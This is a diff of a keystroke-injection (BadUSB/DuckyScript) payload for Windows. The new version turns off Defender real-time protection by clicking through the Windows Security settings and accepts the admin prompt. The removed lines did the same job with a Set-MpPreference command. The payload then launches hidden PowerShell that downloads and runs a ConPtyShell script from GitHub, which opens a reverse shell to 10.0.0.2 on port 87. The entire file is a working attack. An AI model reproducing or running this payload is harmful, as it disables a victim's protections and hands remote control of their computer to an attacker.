@@ -1,20 +1,25 @@
-REM Turn off Windows Defender and start reverse shell
-REM
+REM Turn off Real-time protection and start reverse shell
 DELAY 1000
-GUI r
+GUI 
+DELAY 500
+STRING virus & threat protection
+ENTER
+DELAY 3000
+TAB 
+TAB
+TAB
+TAB
 DELAY 200
-REM Start an elevated powershell instance which will disable Windows Defender.
-STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
 ENTER
-DELAY 1000
-REM if you need administrator [left, enter and delay 1000]
-LEFT
-ENTER
-DELAY 1000
+DELAY 200
+SPACE 
+REM if you need administrator [delay 3000 and alt y]
+DELAY 3000
 ALT y
 DELAY 1000
 GUI r
 DELAY 100
+REM execute powershell command to start reverse shell script
 STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87"
 ENTER
 STRING exit
